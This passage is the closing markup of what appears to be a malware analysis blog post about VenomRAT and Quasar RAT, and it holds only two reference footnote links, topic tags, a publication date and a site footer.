</li>
<li id="fn:5" role="doc-endnote">
<p><a href="https://www.blat.net/">https://www.blat.net/</a> <a href="#fnref:5" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:6" role="doc-endnote">
<p><a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.quasar_rat">https://malpedia.caad.fkie.fraunhofer.de/details/win.quasar_rat</a> <a href="#fnref:6" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</section>

        </div>
        <div class="article-info">
    
        <div class="article-date">2020-06-22</div>
    
    <div class="article-taxonomies">
        
            
                <ul class="article-tags">
                    
                        <li><a href="https://blog.malwarelab.pl/tags/malware">#Malware</a></li>
                    
                        <li><a href="https://blog.malwarelab.pl/tags/skidware">#Skidware</a></li>
                    
                        <li><a href="https://blog.malwarelab.pl/tags/venomrat">#VenomRAT</a></li>
                    
                        <li><a href="https://blog.malwarelab.pl/tags/malware-analysis">#Malware Analysis</a></li>
                    
                        <li><a href="https://blog.malwarelab.pl/tags/quasar-rat">#Quasar RAT</a></li>
                    
                        <li><a href="https://blog.malwarelab.pl/tags/threat-hunting">#Threat Hunting</a></li>
                    
                </ul>
        
    </div>
</div>
    </article>
    


        </main>
        <footer>
            
                <p>Â© 2020<br>
Powered by <a target="_blank" href="https://gohugo.io/">Hugo</a>, theme <a target="_blank" href="https://github.com/mitrichius/hugo-theme-anubis">Anubis</a>.
</p>
            
        </footer>
    </div>
<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script></body>
</html>
